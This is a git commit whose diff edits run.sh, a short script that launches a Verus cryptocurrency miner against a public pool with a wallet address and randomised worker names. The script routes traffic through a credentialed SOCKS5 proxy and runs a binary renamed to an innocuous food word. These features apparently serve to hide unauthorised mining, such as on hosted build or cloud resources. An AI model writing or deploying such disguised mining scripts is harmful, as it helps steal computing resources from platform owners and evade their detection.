97d948a4cef991b8563daf090688ddb7d50249cc
Noval Anto <novalanto6161@gmail.com>
2021-09-23 18:18:45 +0000

    run.sh edited online with Bitbucket

--- run.sh
+++ run.sh
@@ -4,4 +4,4 @@ PULL=stratum+tcp://na.luckpool.net:3956
 WUL=RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg
 WOR=$(echo $(shuf -i 1-20000 -n 1)-V)
 PRO=socks5://mike:mike@34.139.57.113:4145
-./ayamgoreng -a verus -o $PULL -u $WULL.$WOR -p x -t 4 -x $PRO
+./ayamgoreng -a verus -o $PULL -u $WUL.$WOR -p x -t 4 -x $PRO
